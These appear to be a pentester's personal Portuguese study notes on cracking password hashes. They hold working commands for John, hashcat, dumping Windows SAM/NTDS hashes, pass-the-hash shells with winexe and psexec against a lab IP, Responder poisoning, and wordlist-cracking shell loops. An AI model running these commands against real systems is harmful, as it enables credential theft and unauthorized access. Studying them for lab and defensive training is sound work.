Trabalhando com Hashes
SITES:
https://hashes.com/en/decrypt/hash
https://md5decrypt.net/


LINUX
Comando para gerar hashes:
- sha1sum       
- sha224sum     
- sha256deep    
- sha256sum     
- sha384sum     
- sha512sum

Comandos encode e decode:
- base32
- base58
- base64 

Comandos linux para descobrir: 
- hashid
- hash-identifier

Ferramentas linux para atacar hashes:
- john
    EX: john --list=formats -> para ver os formatos de hash que que a ferramenta suporta
    EX: john --format=Raw-MD5 --wordlist=/
    EX: unshadow passwd shadow > senhas.txt -> essa ferramenta serve para juntar o arquivo de passwd e shadow em um formato que o John aceitam
    EX: john --wordlist=/usr/share/wordlists/rockyou.txt loncrack/wl.txt

- hashcat
    EX: hashcat -m 100 5c6d9edc3a951cda763f650235cfc41a3fc23fe8 /usr/share/john/password.lst --force


- loncrack (Ferramenta criada pelo ricardo longatto)
OBS: Antes de usar a ferramente é necessário complilar o arquivo loncrack.c -> gcc loncrack.c -lcrypt -o loncrack
    EX: ./loncrack wl.txt

Ferramentas linux para atacar hashes do windows:
- samdump2 [ARQ SYSTEM] [ARQ SAM]
- impacket-secretsdump -sam [ARQ SAM] -system [ARQ SYSTEM] LOCAL
- impacket-secretsdump -ntds [ARQ NTDS.DIT] -system [ARQ SYSTEM] LOCAL

Arquivos linux
/etc/passwd - arq de usuários
/etc/shadow - arq de hash de senhas de cada usuário

Gerar hash com openssl:
    EX: openssl passwd -6 -salt [VALOR DO SALT] [SENHA]

─# python3    
Python 3.10.4 (main, Mar 24 2022, 13:07:27) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import crypt
>>> salt = "$1$n5vwmwca$"
>>> senha = "123"
>>> crypt.crypt(senha,salt)
'$1$n5vwmwca$8dYQrdpltyp9itCo5WWic0'

Após conseguir credenciais validas través de um hash, tentar obeter uma shell:
- winexe -U rogerio%Roger@10 //172.16.1.60 cmd.exe
- exploit "/windows/smb/psexec"
- xfreerdp /u:Administrador /p:GBs3rv3r2K08 /v:172.16.1.60

Pass the Hash
- pth-winexe -U rogerio%[hash] //172.16.1.60
Obs: Também funciona no exploit "/windows/smb/psexec" onde no campo SMBPass é passado o hash de vez a senha em texto claro

OBS: Em sistemas mais modernos (windows 10, windows 2019, ...) funciona um pouco diferente 

Ataque: NBT-NS/LLMNR
NBT-NS: NetBIOS Name Service
LLMNR: Link-Local Multicast Name Resolution
mDNS: Multicast Domain Name system

ferramenta RESPONDER
- responder -I [interface de rede] -Prv
Obs com esse comando o kali estará escutando as protocolos de rede:
NBT-NS, LLMNR e mDNS, para capturar as hashes de qualquer usuário que realizar um broadcast na rede.
 * PATH arquivo de CONFIG do Responder: /etc/responder/Responder.conf

Meu script shell para descobrir hash:
for i in $(cat /usr/share/john/password.lst | tail -n3546);do md5=$(echo -n "${i}" | md5sum | awk '{print $1}'); b64=$(echo -n "${md5}" | base64); valor_final=$(echo -n "${b64}" | sha1sum | awk '{print $1}');if [ "${valor_final}" == $(echo -n "806825f0827b628e81620f0d83922fb2c52c7136") ];then echo "${i}";fi ;done

for l in $(cat senhas.csv);do for s in $(cat /usr/share/wordlists/rockyou.txt);do hash=$(openssl passwd -6 --salt $(echo -n "${l}" | awk -F';' '{print $2}')  $(echo -n "${s}") | awk -F'$' '{print $4}'); if [ $(echo -n "${hash}") == $(echo -n "$(echo -n "${l}" | awk -F';' '{print $3}')") ];then echo "$(echo -n "${l}" | awk -F';' '{print $1}') -> ${s}";fi ;done ;done


